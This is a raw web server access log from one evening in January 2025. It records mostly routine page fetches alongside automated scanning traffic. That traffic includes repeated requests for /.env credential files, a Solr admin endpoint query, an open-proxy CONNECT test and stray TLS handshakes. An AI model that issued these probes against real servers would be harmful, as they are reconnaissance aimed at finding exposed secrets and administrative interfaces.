164.92.164.34 - - [07/Jan/2025:21:16:45 +0000] "GET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
164.92.164.34 - - [07/Jan/2025:21:16:46 +0000] "GET / HTTP/1.1" 200 1742 "http://35.220.248.27:80/solr/admin/cores?action=STATUS&wt=json" "Go-http-client/1.1"
92.255.57.58 - - [07/Jan/2025:21:18:55 +0000] "\x16\x03\x01\x05\xa8\x01" 400 526 "-" "-"
221.151.65.246 - - [07/Jan/2025:21:20:06 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
220.81.235.208 - - [07/Jan/2025:21:41:11 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.148 - - [07/Jan/2025:21:57:09 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [07/Jan/2025:21:57:10 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
154.213.184.132 - - [07/Jan/2025:22:25:19 +0000] "CONNECT google.com:443 HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
45.156.129.135 - - [07/Jan/2025:22:27:15 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
78.153.140.148 - - [07/Jan/2025:22:40:19 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [07/Jan/2025:22:40:20 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
87.120.125.126 - - [07/Jan/2025:22:54:21 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3844.0 Safari/537.36"
205.210.31.158 - - [07/Jan/2025:22:58:59 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
43.130.39.254 - - [07/Jan/2025:23:06:36 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
43.136.213.192 - - [07/Jan/2025:23:18:33 +0000] "\x16\x03\x01" 400 526 "-" "-"
43.136.213.192 - - [07/Jan/2025:23:35:37 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
185.16.39.104 - - [07/Jan/2025:23:38:20 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
43.136.213.192 - - [07/Jan/2025:23:40:03 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
14.55.1.100 - - [07/Jan/2025:23:41:11 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
